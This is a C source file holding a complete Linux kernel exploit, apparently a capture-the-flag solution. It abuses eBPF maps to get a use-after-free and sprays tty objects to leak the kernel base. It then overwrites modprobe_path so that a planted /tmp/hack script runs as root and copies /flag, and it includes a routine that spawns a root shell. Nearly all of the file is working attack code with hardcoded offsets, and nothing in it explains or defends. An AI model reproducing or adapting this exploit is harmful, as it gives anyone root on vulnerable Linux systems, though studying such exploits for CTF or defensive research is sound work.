      
#define _GNU_SOURCE
#include "bpf_insn.h"
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define PAGE_SIZE 4096
#define HELLO_MSG "AAAAAAAA"
#define MSG_LEN 8

int global_fd;
int control_map, uaf_map;
int reader_fd, reader_sock;
int writer_fd, writer_sock;
uint64_t kbase;

int _bpf(int cmd, union bpf_attr *attr, uint32_t size) {
  return syscall(__NR_bpf, cmd, attr, size);
}

int create_map(int value_size, int cnt) {
  int map_fd;
  union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY,
                         .key_size = 4,
                         .value_size = value_size,
                         .max_entries = cnt};

  map_fd = _bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
  if (map_fd < 0) {
    die("[!] Error creating map");
  }
  printf("[+] created map: %d\n\tvalue size: %d\n\tcnt: %d\n", map_fd,
         value_size, cnt);
  return map_fd;
}

int prog_load(struct bpf_insn *prog, int insn_cnt) {
  int prog_fd;
  char log_buf[0xf000];
  union bpf_attr attr = {
      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
      .insn_cnt = insn_cnt,
      .insns = (uint64_t)prog,
      .license = (uint64_t) "GPL",
      .log_level = 2,
      .log_size = sizeof(log_buf),
      .log_buf = (uint64_t)log_buf,
  };

  prog_fd = _bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
  // printf("[+] log_buf: %s\nLOG_END\n", log_buf);
  if (prog_fd < 0) {
    die("[!] Failed to load BPF prog!");
  }
  return prog_fd;
}

int update_item(int fd, int idx, uint64_t value) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (uint64_t)&idx,
      .value = (uint64_t)&value,
      .flags = BPF_ANY,
  };
  // printf("[+] update_item;\n\tmap_fd: %d\n\tidx: 0x%x\n\tvalue: 0x%lx\n", fd,
  // idx, value);
  return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

uint64_t get_item(int fd, uint64_t idx) {
  char value[0x800];
  uint64_t index = idx;
  union bpf_attr *attr = calloc(1, sizeof(union bpf_attr));
  attr->map_fd = fd;
  attr->key = (uint64_t)&idx;
  attr->value = (uint64_t)value;

  if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) < 0) {
    die("[!] Failed to lookup");
  }

  return *(uint64_t *)value;
}


void pop_shell() {
  if (!getuid()) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[*] Root! :)");
    execve("/bin/sh", argv, envp);
  } else {
    die("[!] spawn shell error!\n");
  }
}

uint64_t load(int map, int uaf_map)
{
    int fd;
    struct bpf_insn prog[] = {
        BPF_MAP_GET(map, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_0), //r2 = r0 = map
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0), // r9 = map[0]
        BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0 ,26), // if(map[0] !=0) jmp write
        BPF_MAP_GET_TO(uaf_map, 0x27, BPF_REG_9),  // r9 = &uaf_map[0x27]
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0), // r6 = uaf_map[0x27]
        BPF_MAP_GET(map, 1),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_0), //r2 = r0 = map[1]
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_6, 0x0), // map[1] = r6
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        
        // write
        BPF_MAP_GET(map, 1),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_0), //r2 = r0 = &map[1]
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, 0), // r9 = map[1] 
        BPF_MAP_GET_TO(uaf_map, 0x2e, BPF_REG_6),  // r6 = &uaf_map[0x2e]
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0x0), // uaf_map[0x2e] = r9    

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
    int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    // printf("[+] insn_cnt = %d\n", insn_cnt);
    fd = prog_load(prog, insn_cnt);
    logd("fd = %d", fd);
    return fd;
}

void trigger(int fd){
    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0)
    {
        die("[!] Failed in socketpair");
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &fd,
                   sizeof(fd)) < 0)
    {
        die("[!] Failed to attach BPF");
    }


    if (send(sockets[1], HELLO_MSG, MSG_LEN, 0) < 0)
    {
        die("[!] Failed to send HELLO_MSG");
    }
}

void prepare(){
    system("echo -ne \"\xff\xff\xff\xff\" >> /tmp/x");
    system("chmod 777 /tmp/x");

    // called by modprobe
    system("echo -ne \"#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag\" > /tmp/hack");
    system("chmod 777 /tmp/hack");
}


int main() {
  prepare();

  uint64_t item;
  uaf_map = create_map(0x8, 0x30);
  control_map = create_map(0x8, 0x400);

  int s_map = load(control_map, uaf_map);

  getchar();
  close(uaf_map);

  logd("spray tty...");
  int tty_fd = open("/dev/ptmx", O_RDWR);

  update_item(control_map, 0, 0);
  kbase = get_item(control_map, 0);

  trigger(s_map);

  kbase = get_item(control_map, 1) - 0x664780;
  logi("kbase: 0x%lx", kbase);
  uint64_t modprobe_path = 0x1b3f580;
  modprobe_path = kbase + modprobe_path;
  logi("modprobe_path: 0x%lx", modprobe_path);

  write(tty_fd, "AAAAAAAAAAAAAAA", 16); // init buffer
  update_item(control_map, 0, 1);
  update_item(control_map, 1, modprobe_path);

  trigger(s_map);
  char payload[] = "/tmp/hack";
  write(tty_fd, payload, sizeof(payload));

  system("/tmp/x");
  system("cat /tmp/flag");

  logd("debug");
  getchar();

  return 0;
}
